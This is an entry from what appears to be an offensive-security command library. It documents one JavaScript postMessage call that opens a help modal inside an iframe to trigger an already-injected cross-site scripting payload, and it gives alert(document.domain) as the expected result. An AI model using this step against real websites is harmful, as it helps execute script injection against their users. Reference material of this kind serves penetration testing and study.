---
id: cmd-uuid-5
data: 'frame.postMessage(''{"method":"toggleHelp"}'',''*'')'
tags:
  - trigger
  - xss
  - postmessage
type: command
output: XSS alert triggered
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:20.155Z'
verified: false
validated: true
submitted: true
---
# toggleHelp-iframe

## Command

```javascript
frame.postMessage('{"method":"toggleHelp"}','*');
```

## Description

Triggers the help modal in the iframe, rendering the injected XSS payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| method | 'toggleHelp' | Yes |
| args | Empty array | No |
| targetOrigin | '*' | Yes |

## Examples

### Basic Usage

```javascript
frame.postMessage('{"method":"toggleHelp"}','*');
```

### Advanced Usage

```javascript
// Same as basic for this method
```

## Expected Output

Help modal opens; if payload injected, alert(document.domain) executes.

## Related

- [[Related Procedure|procedures/Trigger-XSS-via-toggleHelp]]
